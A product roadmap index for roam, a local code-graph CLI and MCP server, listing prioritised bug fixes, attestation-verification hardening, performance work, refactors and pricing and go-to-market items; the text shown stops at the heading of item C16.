# Roadmap — full demand index

Master index of ~155 items synthesised from 8 deep-audit lenses run
2026-05-10. **What to build / research / test next.** Items get pulled
from here into `dev/BACKLOG.md` when they're queued up.

Each item carries an audit-angle tag in square brackets — `[01]` =
positioning, `[02]` = GTM, `[03]` = architecture, `[04]` = agent / MCP
DX, `[05]` = security, `[06]` = developer experience, `[07]` = site /
brand, `[08]` = performance. `[S]` = this session's work, `[D]` =
dogfood-derived. Cross-references called out where two or more lenses
independently flagged the same gap. Full citations live in the Sources
section at the bottom.

---

## TIER ★★★★★ — Top moves (ship-this-week-or-next class)

These are the items at least two of: (a) named in a Top 5, (b)
load-bearing for a paid product about to launch, (c) correctness gap
that misleads buyers/agents, (d) revenue-blocking with effort < 5 days.

### S1. Fix `roam init` writing `.github/workflows/roam.yml` unsolicited [06 R1]
- **Where:** `src/roam/commands/cmd_init.py:113-120`
- **Effort:** 15 LOC
- **Why now:** Touches 100% of installs. Trust-damaging side-effect on first
  command. Users on GitLab/Bitbucket get stray GitHub config; users
  evaluating roam in private repo get "what is this file?" moment. Even
  the `--yes` flag is misnamed (default IS non-interactive).
- **Move:** Delete the unconditional write. CI generation moves to
  `roam init --with-ci=github` OR rely on existing `roam ci-setup
  --platform github --write`. Keep `.roam/fitness.yaml`.

### S2. Fix the rename-no-recovery silent-correctness bug [08 S1]
- **Where:** `src/roam/index/indexer.py:1618`
- **Effort:** 1-word fix + regression test
- **Why now:** Pure rename produces `(added=[bar.py], modified=[],
  removed=[foo.py])`. The gating clause `if not force and modified and
  changed_file_ids` skips edge recovery when `modified=[]`. CASCADE wipes
  edges into the renamed symbol; callers of `foo.qualified_name` are
  never re-extracted. **Edge counts after a rename are silently lower
  than after `--force` reindex.** Symptom: `roam impact <renamed_symbol>`
  returns fewer callers than reality.
- **Move:** Drop the `and modified` clause: `if not force and
  changed_file_ids`. Add `tests/test_index.py::test_rename_preserves_xfile_edges`
  comparing rename-incremental edge count to `--force` reindex count.

### S3. Replace mailto-as-buy-button on PR Replay (and Review/Cloud) [02 A1]
- **Where:** `templates/distribution/landing-page/audit.html` `STRIPE_TEAM_LINK`
  and `STRIPE_DEEP_LINK` placeholders → mailto fallback. Also
  `pricing.html` and `index.html` Review/Cloud CTAs.
- **Effort:** 1-5 days once payment processor clears
- **Why now:** Single highest-leverage GTM change. The HTML literally has
  the placeholder comment ("when the live Stripe Payment Link URL is
  ready, replace…"). Mailto on a $2,500 ticket is malpractice. Per AADE
  delay, use Stripe Atlas (LLC, 5-day setup) OR Lemon Squeezy (Merchant
  of Record, 2-day setup, handles VAT) as bridge.
- **Move:** Live payment processor this week. Switch back to
  Greek-entity Stripe when AADE clears. Routing: webhook → kickoff
  email. Per-tier discount code emitted to deliverable for Review
  conversion tracking.

### S4. Fix `roam cga verify` silently skipping cosign [05 R4] — SHIPPED in df4a091
- **Where:** `src/roam/commands/cmd_cga.py:294-381` (cga_verify fail-closed branch)
- **Status:** Done. `cga verify` now fails closed when no bundle is
  detected; `--no-cosign` is required for explicit predicate-only
  acknowledgment. Shipped alongside the S5 dirty-hash binding in the
  "deep audit follow-through" commit (df4a091).
- **Original brief retained below for provenance.**
- **Effort:** 0.5 day
- **Why now:** A user with the `.json` statement but no sibling `.bundle`
  gets verdict "CGA verified — predicate matches live index" while the
  cosign cryptographic-trust half is null. The text doesn't say
  "cosign skipped"; only the JSON envelope's `cosign: null` reveals it.
  Compliance officer accepts a green-light verdict that crypto-verifies
  nothing. The CI workflow only tests predicate tampering; the
  bundle-absent path is regression-blind.
- **Move:** **Fail closed by default** when no bundle is detected. Add
  `--no-cosign` opt-in flag for explicit acknowledgment. CI tests:
  (a) bundle-absent → fail-closed, (b) commit-SHA swap → fail,
  (c) dirty-tree-at-sign-time → fail. Bundle-`git_dirty_hash` and
  `git_commit_sha1` reproduction (S5).

### S5. Bind `git_dirty_hash` + `git_commit_sha1` into predicate verification [05 R1, R2] — SHIPPED in df4a091
- **Where:** `src/roam/attest/cga.py:254` (predicate emit) and
  `src/roam/attest/cga.py:405-440` (verifier checks).
- **Status:** Done. `git_dirty_hash` and `git_commit_sha1` are now
  embedded in the predicate and the verifier refuses on commit-SHA
  mismatch or dirty-tree mismatch (clean-then-dirty / dirty-then-clean
  / digest-changed). Shipped with the S4 fail-closed branch in commit
  df4a091.
- **Original brief retained below for provenance.**
- **Effort:** 1 day
- **Why now:** Highest-leverage technical P0 in the security review. The
  manifest collects `_git_dirty_hash()` (sha256 of `git status
  --porcelain`) but it's **never embedded in the predicate** and
  **never checked by the verifier**. A signed CGA that asserts a clean
  commit can be produced on a tree with uncommitted edits. The
  attestation chain implies a property the artifact does not carry.
  Single highest-leverage gap.
- **Move:** (a) Embed `git_dirty_hash` and `git_commit_sha1` in the
  predicate body. (b) `verify_cga_statement` reads the latest manifest
  row and refuses if dirty hash present in predicate ≠ live, or live
  tree dirty when predicate claims clean. (c) `cga emit --sign` refuses
  on dirty working tree by default; `--allow-dirty` for emergency.

### S6. Rewrite `dpa.md` for Roam Review with no-training clause inline [05 R3]
- **Where:** `templates/legal/dpa.md` (currently flagged "Superseded for
  launch until rewritten")
- **Effort:** 1 week of legal drafting + counsel pass
- **Why now:** Procurement packet § 6 + audit.html:360 make
  contractual-grade no-training promises. **DPA omits the clause and is
  internally flagged superseded.** Customer signing the DPA is not bound
  by the no-training promise unless SOW or Terms incorporate the
  procurement packet § 6 by reference. Today, neither does. **A CISO
  catches the gap in 30 seconds.** Single thing a CISO actually signs
  against.
- **Move:** Rewrite Review-specific. Inline the
  commonpaper.com no-training clause. Fill `[CLOUD_PROVIDER]` /
  `[POSTGRES_PROVIDER]` / `[OBJECT_STORAGE]` placeholders with concrete
  vendor names. Counsel pass before binding.

### S7. Rename "structural intelligence layer" → "code-graph engine for coding agents" [01 A1]
- **Where:** Every public surface — hero, llms.txt, press kit, README,
  JSON-LD description, OG/Twitter descriptions.
- **Effort:** Copy edits across ~20 files
- **Why now:** Buyers search "code graph" / "context engine" / "graph
  for AI coding." They do not search "structural intelligence." Atlan,
  Packmind, Tessl, Augment Code are sitting on Roam's actual market
  with worse capability and better SEO. Roam is selling a real product
  into a real category in a private dialect. Per-Anthropic 2026 founder
  consensus: positioning that needs a 10-minute explanation is too weak.
- **Move:** Pick one externally-legible category noun. Top candidates:
  (a) "code-graph engine for agents", (b) "context engine for agents",
  (c) "structural review for AI PRs". Keep the senses table; drop the
  word "senses" from H1s. Test in /v2 A/B (D1) if signal needed.

### S8. Lead with "100% local" in the hero [01 A3, 07 cross-ref]
- **Where:** `templates/distribution/landing-page/index.html` hero
- **Effort:** XS (single-string)
- **Why now:** Post-CodeRabbit-RCE this is the strongest unhedged claim
  Roam owns. Currently sits five lines below the fold and gets explained
  in the FAQ. Procurement remembers August 2025; the strongest thing
  Roam can say is whispered.
- **Move:** Eyebrow becomes "100% local. No telemetry. No API keys." OR
  hero strapline becomes "The local code-graph engine for coding agents."

### S9. Add `roam_ask` MCP tool [04 R1]
- **Where:** New tool in `src/roam/mcp_server.py` wrapping `cmd_ask.py`
- **Effort:** 1 day
- **Why now:** The 24-recipe TF-IDF intent dispatcher is **CLI-only**.
  Agents on MCP cannot reach it; they fall back to Grep+Read where
  intent dispatch would map "is it safe to delete X" → preflight+uses
  in one call. Three independently-maintained encodings of the same
  workflow matrix (recipes / agent contract HTML / SKILL decision table /
  4 compound tools). When they drift, agents see different answers.
- **Move:** `roam_ask(query: str, recipe: str = "")` returns chosen
  recipe + run results in standard envelope. Measurement: count of
  `roam_ask` calls per session as % of total tool calls (need
  telemetry — see S20).

### S10. Add hero CTAs to /pricing and /compare [07 #1]
- **Where:** `pricing.html` and `compare.html` `.hero-inner` blocks
- **Effort:** XS (paste a `.hero-ctas` div)
- **Why now:** Single most quantifiable conversion gap on the site.
  User lands on a paid-evaluation page from a paid-evaluation context
  and the first button is several screens down inside the products
  section. **No hero CTA on either page.**
- **Move:** Pricing: "See Roam Review tiers" (primary, `#review`) +
  "Install the free CLI" (secondary, `/`). Compare: anchor to
  `#methodology` + Install CLI.

### S11. Override `roam --help` and bare `roam` to a 30-line "Start here" panel [06 R3]
- **Where:** `src/roam/cli.py:format_help` (LazyGroup)
- **Effort:** ~80 LOC
- **Why now:** First-time user runs `roam` to see what it is and gets a
  154-line wall of text. The 5-verb mental model from the README is
  **invisible** in `--help` — `understand`, `retrieve`, `context`,
  `preflight`, `critique` scattered across "Getting Started" (38
  entries) and "Daily Workflow" with no callout. The help output
  undermines its own narrative.
- **Move:** Short banner with 5 verbs + `init` + `doctor` + `ask`,
  pointer to `--help-all` and `roam tour`. Long help available behind
  `--help-all`.

### S12. Lead install instructions with `uv tool install` [06 R2]
- **Where:** `README.md:247-263`, `setup.html:88`, `getting-started.html:86`
- **Effort:** ~10 LOC across 3 docs
- **Why now:** PEP 668 broke `pip install` for new users on macOS 14+,
  Ubuntu 23+, Debian 12+, Homebrew Python — and `pip` is the path the
  docs lead with. `uv` is the de-facto 2026 winner; `pipx` is second-best;
  bare `pip` should come last with venv warning.

### S13. Stripe-style "Your first 10 minutes" doc page [06 R5]
- **Where:** New `docs/first-10-minutes.html`
- **Effort:** 1 doc page
- **Why now:** No path in the docs walks through "you just installed
  roam, here's your first useful PR-shipping moment in <10 minutes." The
  agent contract is abstract. Larridin 2026: developers who make first
  API call within 10 minutes are 3-4x more likely to convert to paid.
- **Move:** Six commands, six expected outputs. Real `roam critique`
  finding (clones-not-edited) at the end as the "wow" moment.

### S14. Compact agent-contract response block on every MCP tool [04 R4]
- **Where:** `src/roam/output/formatter.py:json_envelope` post-process
- **Effort:** 1 day
- **Why now:** Today's envelope is verbose: 5-50KB. Agents on context-
  tight clients need a low-cost path. 2026 baseline (Anthropic skill
  authoring docs): structured tool output that fits in 200 tokens. Atlassian
  MCP redesign: 48% lower token cost, 44% better accuracy from refactoring
  exactly this.
- **Move:** Add `agent_contract: {facts, risks, next_commands,
  confidence}` block, ~200 token bounded. Agents on tight budgets read
  just `agent_contract`; agents on full payloads parse `facts` + `payload`.
  Implementation: post-process the envelope; reuses existing data.

### S15. Soft contract enforcement on destructive tools [04 R5]
- **Where:** `roam_mutate`, `roam_safe_delete --apply`, `roam_ingest_trace`,
  `roam_vuln_map` in `src/roam/mcp_server.py`. Use existing
  `mcp_extras/session.py` infra.
- **Effort:** ~30 LOC across 5 tools
- **Why now:** Agent contract is documentation-only today; the 2026
  expectation (OpenAI guardrails / agent-guardrails) is runtime
  enforcement at the orchestration layer. Without precondition memory
  the contract is a behaviour the agent can read once and forget.
- **Move:** Inject `contract_compliance: {step_skipped: "simulate",
  advice: "..."}` into destructive-tool responses. Soft-warn, don't
  refuse. Reuses existing session infra.

### S16. Bump `USER_VERSION` discipline [03 R6]
- **Where:** `src/roam/db/connection.py:354` (currently `USER_VERSION = 12`)
- **Effort:** 30 minutes
- **Why now:** `manifest.py:177` reads PRAGMA `user_version`; the constant
  has caught up to schema reality (now 12) but the discipline of
  bumping-on-schema-change is still informal. Every `index_manifest`
  row carries this value; drift between code-as-shipped and the value
  written here turns the manifest into a misleading "schema_version"
  signal. Pre-condition for every other manifest-based check.
- **Move:** Keep bumping on every schema change. Add CI check (or
  pre-commit hook) that fails if `schema.py` or the `_safe_alter` block
  in `connection.py` changed but `USER_VERSION` didn't.

### S17. Wire `roam doctor` to read `index_manifest` [03 R7]
- **Where:** `src/roam/commands/cmd_doctor.py`
- **Effort:** ~20 LOC
- **Why now:** Best example of "shipped but not consumed." `manifest.py`
  writes a manifest on every successful index run, `manifest_diff()`
  exists, but `cmd_doctor.py` doesn't call them. Closes the loop on the
  just-shipped table before it bit-rots.
- **Move:** Call `manifest.latest_manifest(conn)`; run `manifest_diff(prev,
  current)` against a freshly-collected manifest; flag drift fields.

### S18. Surface-consistency test (stop-the-bleed) [03 R11]
- **Where:** New `tests/test_surface_consistency.py`
- **Effort:** Half day
- **Why now:** 5 assertions catch the 8-way split-brain drift TODAY.
  Adding any command requires touching 3-5 dicts; `lsp` is already
  uncategorised. Test stops the bleed before the larger Capability
  Registry rework lands.
- **Move:** Assertions: every `_COMMANDS` entry has a `_CATEGORIES`
  entry (or is on documented allowlist); every `_CORE_TOOLS` member is in
  `_REGISTERED_TOOLS`; every `_NON_READ_ONLY_TOOLS` is registered; every
  `_TASK_REQUIRED_TOOLS` is registered; every
  `_DEPRECATED_COMMANDS.replacement` resolves.

### S19. Embed `roam doctor` hint in environmental error paths [06 R4]
- **Where:** `resolve.py`, `connection.py`, indexer error paths, MCP
  startup (~10 sites)
- **Effort:** ~30 LOC
- **Why now:** 17-check `roam doctor` is excellent and almost nobody
  finds it. None of the actual error messages link to it. Users blame
  the tool rather than running diagnostics.
- **Move:** Append to every environmental error: `If this looks
  unexpected, run \`roam doctor\` to diagnose your install.`

### S20. Tool usage telemetry on the MCP server [04 R3]
- **Where:** Extend `src/roam/mcp_extras/concurrency.py` with
  `_tool_invocations: Counter` keyed by tool name + outcome
- **Effort:** Half day
- **Why now:** Without visibility into which of the 137 tools are
  actually called, every other recommendation is unfalsifiable. Long
  tail of 90+ tools may be entirely dead weight inflating schema cost;
  we don't know.
- **Move:** Local-only ring buffer (matches positioning). Expose via
  `roam mcp --metrics-dump` or a new `roam_session_metrics` tool. Drop
  tools called <0.1% over 30 days of dogfood.

---

## TIER ★★★★ — High-leverage moves (next-sprint class)

### A. Architecture / debt substrate

#### A1. Finish stalled Capability Registry adoption [03 R1]
- **Where:** `src/roam/capability.py` exists; only 5 of 211 commands use
  it. Plus `cli.py` `_COMMANDS`, `cmd_surface.py` `_MATURITY`,
  `cmd_explain_command.py` `_STALE_SENSITIVE`, mcp_server.py
  `_CORE_TOOLS`/`_NON_READ_ONLY_TOOLS`/etc.
- **Effort:** Medium (~206 commands × ~3 minutes/decoration + collapse
  4 dicts to derived views)
- **Why now:** Same conceptual data — *what is this command?* — lives
  across 8+ separate dicts in 3 files. Each new feature adds entries to
  ~5 of them. Visible cost is small (10 min per command); **invisible
  cost is the silent-omission bug rate**, which scales O(N²) with
  feature count × dict count. Substrate landed; migration stopped.
- **Move:** Extend `Capability` dataclass with `maturity`,
  `stale_sensitive`, `mcp_expose`, `mcp_preset`, `side_effect`,
  `task_required`, `destructive`. Decorate 206 commands (start
  highly-used: `health`, `complexity`, `understand`, `retrieve`,
  `critique`, `preflight`, `context`, `search`, `uses`, `impact`).
  Make existing dicts derived views. Add CI test that fails when a
  `_COMMANDS` entry resolves to a function without decoration. **Critical
  caveat**: emit a static manifest at build time (via `roam surface
  --emit`) so the registry doesn't force eager imports and break LazyGroup.

#### A2. Migration sequence numbers + bumped USER_VERSION [03 R2]
- **Where:** `src/roam/db/connection.py:172-247`, `src/roam/db/schema.py`,
  new `src/roam/db/migrations/000N_*.sql` directory
- **Effort:** Medium
- **Why now:** 27 base tables + 40+ `_safe_alter()` calls in one giant
  function. `_safe_alter` only handles `ADD COLUMN`. The day a
  drop/rename/type-change is needed, no path exists. yoyo-migrations
  style is closer to roam's zero-heavy-deps spirit.
- **Move:** Numbered SQL files; track applied in new `schema_migrations`
  table `(version int, applied_at)`. Apply unapplied on startup; bump
  user_version. Ship 5-10 migrations representing existing state.

#### A3. Detector registry + `@detector` decorator [03 R4]
- **Where:** `src/roam/catalog/detectors.py` (4,286 lines, 34 detectors),
  `src/roam/catalog/tasks.py`, `src/roam/commands/cmd_math.py`
- **Effort:** Medium
- **Why now:** Per-detector test count assertion (memory file
  `detector_catalog_parity.md`) — adding a detector requires changes in
  detectors.py + tasks.py + tests/test_math.py. Three places. Same
  pattern as the surface split-brain.
- **Move:** `@detector(task_id, languages, confidence_basis,
  query_cost)` collects detectors into a registry. Per-detector
  metadata enables `roam math --list-detectors`, `--only <detector>`,
  `--exclude <detector>`. Tests assert every detector has a fixture +
  expected count.

#### A4. Finding Registry hybrid table [03 R5, CODE-BACKLOG D2]
- **Where:** New `src/roam/db/findings.py`, `src/roam/db/schema.py`
  add `findings` table.
- **Effort:** Medium
- **Why now:** Every detector has its own emit shape. Cross-detector
  dedup is impossible. Suppression management has no audit trail. Pre-
  condition for the eventual WorkflowRun substrate (CODE-BACKLOG D1).
- **Move:** Denormalised
  `findings(id, finding_id_str, subject_kind, subject_id, claim,
  evidence_json, confidence, source_detector, supersedes_id,
  suppressions, created_at)`. Every detector emits one row in addition
  to its existing table. Unlocks `roam findings --filter ...` +
  central SARIF emit (R18).

#### A5. Split `cmd_health.py:health()` 920-line god function [03 R3]
- **Where:** `src/roam/commands/cmd_health.py:920` and
  `src/roam/index/indexer.py:_compute_file_health_scores` (191 lines)
- **Effort:** L (1-2 weeks)
- **Why now:** Two scoring engines disagree by ~5% on roam itself. New
  signals (runtime, vuln-reach) keep duplicating wiring. Highest-leverage
  refactor in the entire codebase per pure-LOC-and-coupling metric.
- **Move:** Extract `Scorer` ABC with `name`, `score_files`,
  `score_symbols`, `weight`. 7 sub-systems become Scorer subclasses
  (cycles, god components, dead exports, complexity, churn, entropy,
  cognitive load). Bonus: `roam health --explain <factor>` returns
  per-Scorer evidence dict.

#### A6. Per-bridge / per-detector / per-extractor version stamps [03 R10]
- **Where:** `src/roam/bridges/base.py`, detectors, `src/roam/languages/base.py`
- **Effort:** Medium
- **Why now:** When a bridge's inference logic changes, the index built
  with v1 has stale edges marked `bridge='django'`. No field to
  disambiguate. Same for detectors and language extractors. Codebase-Memory
  + Augment Code both stamp this.
- **Move:** `VERSION = "1.0.0"` to each ABC. Stamp into
  `edges.bridge_version`, `findings.source_version`,
  `symbols.extractor_version`. Manifest captures version map for
  drift detection.

#### A7. MCP tool versioning (FastMCP 3 native) [03 R8]
- **Where:** `src/roam/mcp_server.py:802` `_tool` decorator
- **Effort:** Medium
- **Why now:** FastMCP 3 ships `component versioning` natively; roam
  ignores it. Tool semantics drift quietly between versions and agents
  have no way to detect.
- **Move:** Add `version` arg to `@_tool(...)`. Inject into
  `_TOOL_METADATA[name]['version']`. Surface in `roam_catalog`. Default
  '1.0.0'; bump when input/output schema changes.

#### A8. Indexer step-completion manifest [03 R12]
- **Where:** `src/roam/index/manifest.py`,
  `src/roam/index/indexer.py:_record_manifest`
- **Effort:** Medium
- **Why now:** 22 sub-steps; every non-parse has try/except that logs and
  continues. **No degraded-mode flag stored in DB.** Failure scenario:
  `_run_clustering` fails (NetworkX OOM); index marked complete; `roam
  health` reads stale clusters; reports based on stale data.
- **Move:** Track which sub-steps succeeded/failed/skipped. Add
  `index_manifest.steps_status` JSON column. Doctor surfaces "your index
  is missing taint analysis because that step failed."

### B. Performance heavy hitters

#### B1. Fused AST walker (cognitive + Halstead + math signals in one traversal) [08 S3]
- **Where:** `src/roam/index/complexity.py:_walk_complexity` +
  `_compute_halstead` + `_extract_math_signals`
- **Effort:** 1-2 days
- **Why now:** **2-3x indexing speed-up on Python/TS.** Currently 4
  separate full-subtree walks per callable. On a 5000-symbol Python repo
  this is the single biggest indexing cost after parsing itself.
- **Risk:** Medium — bool-op + Halstead-operator + math-loop accounting
  must stay byte-identical. Existing 6200+ tests provide the verification
  surface.

#### B2. Cache controller-file reads in `_find_eager_loads` [08 S2]
- **Where:** `src/roam/commands/cmd_n1.py:558-664`
- **Effort:** 30 minutes
- **Why now:** **5-10x speedup on Laravel `roam n1`.** Re-reads
  `*Controller.php` per model — for 100 models × 50 controllers = 5000
  disk reads → 50 with caching.
- **Move:** Lift the controller-file SELECT + `read_text` out of the
  per-model loop into `analyze_n1`; read each file once into
  `dict[path, str]`.

#### B3. Bulk-fetch the rest of `cmd_n1.py` helpers [08 B3]
- **Where:** `_find_appends_properties`, `_find_accessor_methods`,
  `_find_collection_contexts`, `$with` query in `_find_eager_loads`,
  `_trace_io_via_edges`
- **Effort:** 4 hours
- **Why now:** The session shipped the bulk model-method fetch but the
  deep helpers are still per-model — measurable on Laravel/Django apps
  with 100+ models. Further 2x on `roam n1`.
- **Move:** Each helper gets a single bulk pre-loop fetch; preserve
  fallback paths (file-range when parent_id missing) as secondary.

#### B4. Parallel parse + extract via `ProcessPoolExecutor` [08 A1]
- **Where:** `src/roam/index/indexer.py:_process_files`
- **Effort:** 3 days
- **Why now:** **3-5x indexing on cold cache.** CPU-bound parse
  parallelises; SQLite stays serial. Workers parse + extract in pool,
  return Python dicts; main thread batch-INSERTs.
- **Risk:** High — pickling/fork-vs-spawn/Windows perf flakes. Tree-sitter
  Tree objects don't pickle (workers must finish AST walks and return
  dicts). Disable on `--force` <50 files (overhead exceeds gain). Opt-in
  via `ROAM_PARALLEL_INDEX_PROC=N`; promote to default when battle-tested.

#### B5. Skip git-history pass when HEAD unchanged [08 A2]
- **Where:** `src/roam/index/git_stats.py:collect_git_stats`
- **Effort:** 1 hour
- **Why now:** Saves 1-10s per warm `roam index` run. Manifest already
  records the commit hash. Free win.
- **Move:** Read `git rev-parse HEAD` once. Compare with
  `index_manifest.head_commit`. If equal, skip the full pass.

#### B6. Promote `mmap_size` to 1GB; add `wal_autocheckpoint` + `optimize` [08 A3]
- **Where:** `src/roam/db/connection.py:140`
- **Effort:** 30 minutes
- **Why now:** Current 256MB is conservative; phiresky reference cites
  1GB+ as common. `wal_autocheckpoint=10000` (vs default 1000) reduces
  write amplification 10x on heavy index loads. `PRAGMA optimize` keeps
  query planner stats fresh.

#### B7. External-content FTS5 mode + incremental update [08 A5]
- **Where:** `src/roam/db/connection.py:_ensure_fts5_table` and
  `src/roam/search/index_embeddings.py:build_fts_index`
- **Effort:** 1 day
- **Why now:** Eliminates ~50% storage duplication. Today FTS5 does full
  rebuild every run — heaviest non-parse cost on 1M-LOC repos.
- **Move:** Switch to `content='symbols', content_rowid='id'`. Add
  triggers OR explicit incremental: `INSERT INTO symbol_fts(symbol_fts,
  rowid) VALUES('delete', old_id)` for removed symbols, then re-INSERT.

#### B8. Add `docstring` column to `symbol_fts` [08 A6]
- **Where:** `src/roam/db/connection.py:_ensure_fts5_table`
- **Effort:** 4 hours
- **Why now:** **15-25% retrieval recall@20 improvement.** Today's FTS5
  schema is `(name, qualified_name, signature, kind, file_path)` — never
  sees docstring text. `roam retrieve "trace login flow"` mixes FTS5 +
  structural rerank but the FTS5 side is missing the text agents
  actually search.
- **Move:** Add column; suggest BM25 weight 4. Re-run eval harness.
  Existing baseline: 0.503 default → expected >0.55.

### C. GTM / monetization next-tier

#### C1. List `roam-pr-comment` as a free GitHub Action on Marketplace [02 B1]
- **Where:** Package `roam pr-replay --tier sample` engine; `templates/ci/agent-review.yml`
  is 80% built.
- **Effort:** 2-5 days
- **Why now:** Zero Marketplace surface today. CodeRabbit captured 80K
  installs / 8K paying customers via the same channel in 12 months.
  Marketplace is the proven $5M → $40M ARR channel.
- **Move:** Apache 2.0 free Action under "Code review" category. Footer:
  "Liked this? Hosted Roam Review handles 50+ reviews/mo without CI cost.
  Try free → /pricing". Apply for "Featured."
- **Success metric:** 1,000 installs by month 3; 5,000 by month 9; 75
  paid Review conversions over 12 months (1.5%).

#### C2. Tighten Roam Review Starter caps [02 A4]
- **Where:** `pricing.html`, JSON-LD `Offer`
- **Effort:** 30 minutes
- **Why now:** Current Starter (5 repos / 10 PR authors / 200 reviews/mo)
  eats 2-15-dev shops who should be on Team ($299 = 3x ARR per logo).
- **Move:** Drop to "3 repos, 5 active PR authors, 100 reviews/mo." Team
  becomes the natural upgrade for any team >5 PR authors. Target: of
  first 50 paying customers, ≥30% on Team or above.

#### C3. Open Roam Review "Founding Customer" $99/mo lock [02 A2]
- **Where:** New `/review/founding-customer` page
- **Effort:** 4 hours
- **Why now:** Captures pre-build commitment cash + de-risks build
  prioritisation (real customers, real feedback). Aug 2 EU AI Act window
  pulls demand forward. **Cap at 30 publicly** ("8 of 30 spots open").
- **Move:** Stripe Payment Link with $0 trial → $99/mo subscription.
  "First 30 customers lock $99/mo for life. Pay today, billed monthly
  starting at first PR-comment ship date."

#### C4. Pull Self-Hosted from public 4-card to `/enterprise` [02 A3]
- **Where:** `pricing.html`, `index.html`, new `/enterprise`
- **Effort:** 1 day
- **Why now:** v3 memo said do this 3 days ago; not done. Saves founder
  hours. Captures regulated buyers behind a qualifying gate.
- **Move:** Remove Self-Hosted from public 4-card. New `/enterprise`:
  qualifying intake form (regulated? EU AI Act-affected? # devs? annual
  budget band?), Calendly gated behind intake, **public mention of
  $7.5k/90-day pilot — 3 slots, Q3 2026, X open**.

#### C5. Add annual-discount toggle on /pricing [02 A5]
- **Where:** `pricing.html`
- **Effort:** Half day
- **Why now:** 17% ACV uplift at the same logo count. Standard 2026 SaaS
  convention; absence reads as un-finished.
- **Move:** Toggle "Pay monthly · Pay annual (save 17%)". Default
  annual. Two Stripe Payment Links per tier.

#### C6. Bundle Cloud Lite into Roam Review Team+ visibly [02 B2]
- **Where:** `pricing.html` Review tier card; Cloud page dedicated section
- **Effort:** 1 day for copy (Cloud Lite engineering separate, Phase 3)
- **Move:** Prominent line "Includes Roam Cloud Lite (current-run
  dashboard) — $19/repo value." Bundle is the only way Cloud monetises
  against LinearB / CodeScene / Faros.

#### C7. Cloud Solo $39/mo tier [02 B3]
- **Where:** `/cloud` between Free and Team
- **Effort:** 1 day for pricing change
- **Why now:** Indie hackers / consultants / OSS maintainers are a real
  segment that the Free → $99 jump strands. PLG benchmarks: dev tools
  convert solo at 3-10x marketing-sourced trials.
- **Success metric:** 50 Solo subscribers within 6 months ($23,400 ARR).

#### C8. "Your repo flagged X" Risk Snapshot lead-magnet [02 B4]
- **Where:** New `/snapshot` (or `/check-my-repo`)
- **Effort:** 5-7 days
- **Why now:** Public-repo only. Drop public GitHub URL → returns 1-page
  Risk Snapshot (`roam pr-replay --tier sample` on last 5 merged PRs) →
  email-gated download → automated follow-up offering PR Replay Team or
  free Review beta. Closest to free.
- **Move:** Backend job runner + email capture + Mailgun follow-up.
  GitGuardian's Good Samaritan converts at ~10%.

#### C9. Trust-and-compliance page with SOC 2 / ISO 42001 status [02 B6]
- **Where:** New `/trust`
- **Effort:** 1-2 days for page; ~$15-25K + 6-12 months for audit
- **Why now:** Procurement reviews stall here; even "in progress" status
  with named timeline gets through ~80% of buyer-side checklists.
- **Move:** Honest stance: "SOC 2 Type II — controls in design, expected
  Q1 2027. ISO 42001 — gap analysis underway, expected Q3 2027." Plus
  DPA, sub-processor list, security contact, vulnerability disclosure,
  data flow diagram.

#### C10. Public-repo Good Samaritan outreach batch #1 [02 B7]
- **Where:** Manual founder outreach
- **Effort:** 4-6 hours/week, batches of 10/week
- **Move:** Identify 50 popular OSS repos using Cursor / Claude Code (via
  cursor.directory or AGENTS.md). Run PR Replay sample on each. Email:
  "We ran Roam against your last 5 merged PRs and found N structural
  issues. Anonymized report attached. Run it yourself: pip install
  roam-code." No paid CTA in first email.

#### C11. Pricing-page FAQ block [02 B8]
- **Where:** Bottom of `pricing.html`
- **Effort:** 2 hours
- **Why now:** Pricing FAQs lift conversion 8-12% (Baymard data).
- **Move:** `<details>` answering: "What if my team doesn't use AI
  agents?" / "What if we already use CodeRabbit?" / "Can I trial without
  a credit card?" / "How does the Cloud bundle work?" / "What happens if
  I exceed the cap mid-month?"

#### C12. Agent Governance Evidence Pack [02 C10, 05 cross-ref]
- **Where:** New `/governance` or `/trust` page; `templates/legal/`;
  `dev/MONETIZATION-OPPORTUNITIES-2026-05-13.md`
- **Effort:** 1-2 days for public page + control matrix; counsel pass
  before binding.
- **Why now:** Web research validates AI-governance evidence as a real
  buyer language: EU AI Act Article 12 centers record-keeping, ISO/IEC
  42001 gives AI management-system language, and NIST AI RMF gives a
  voluntary risk-management frame. Roam already has `runs`,
  `pr-bundle`, `audit-trail-*`, `cga`, `mode`, `permit`,
  `article-12-check`, `agent-score`, and `constitution`.
- **Move:** Productize as a paid setup: "Prove which agent changed what,
  what it read first, what risks it accepted, and which tests closed the
  loop." Price as $5k-$15k setup + quarterly evidence retainer; bundle
  into Self-Hosted for regulated buyers.

#### C13. Premium Rules and Policy Packs [02 C11]
- **Where:** `templates/rules/`, future `templates/rules/premium/`,
  `rules/community/`, `src/roam/policy/`
- **Effort:** 1 day for taxonomy; 3-10 days per first paid pack.
- **Why now:** Competitors sell broad PR review; Roam can sell local,
  graph-aware policy. Built substrate: `rules`, `rules-validate`,
  `check-rules`, taint rules, SARIF export, plugin substrate, and
  graph clauses.
- **Move:** Define free community pack vs paid packs: fintech/payments,
  healthcare, OWASP/appsec, Django/Rails/Laravel/Next.js, AI-generated
  code quality gates. Sell first as custom implementation, then convert
  repeated rules into paid packs.

#### C14. Team MCP Gateway [02 C12, 04 cross-ref]
- **Where:** New product one-pager first; later hosted/self-hosted MCP
  service wrapping `roam mcp`.
- **Effort:** 1 day for one-pager; engineering only after customer pull.
- **Why now:** Cursor supports remote MCP over SSE/Streamable HTTP with
  OAuth, the official MCP Registry is a discovery channel, and Anthropic
  has a connector directory. Roam already ships `server.json`, MCP
  presets, tool metadata, completions, watcher/session extras, and
  `mcp-status`.
- **Move:** Position as "one authenticated Roam MCP endpoint for every
  team agent." Price as $99/team/mo + repo add-ons or bundle into Review
  Team+. Defer implementation until a Review/Self-Hosted prospect asks.

#### C15. Security Reachability Triage [02 C13, 05 cross-ref]
- **Where:** Audit page add-on once sample report exists;
  `templates/audit-report/`; `src/roam/security/`
- **Effort:** 2-4 days for sample report and command recipe.
- **Why now:** Snyk validates developer-security budgets and Endor Labs
  validates reachability as a vulnerability-prioritization story. Roam
  already has `sbom`, `supply-chain`, `vulns`, `vuln-reach`,
  `vuln-map`, `taint`, `taint-classify`, `secrets`, SARIF, and graph
  context.
- **Move:** Sell one-shot "Reachability Triage" reports for teams buried
  in scanner noise. Price $1.5k-$7.5k initially; later bundle as a
  Review/Cloud add-on.

#### C16. Agent Vendor Benchmark Report [02 C14]
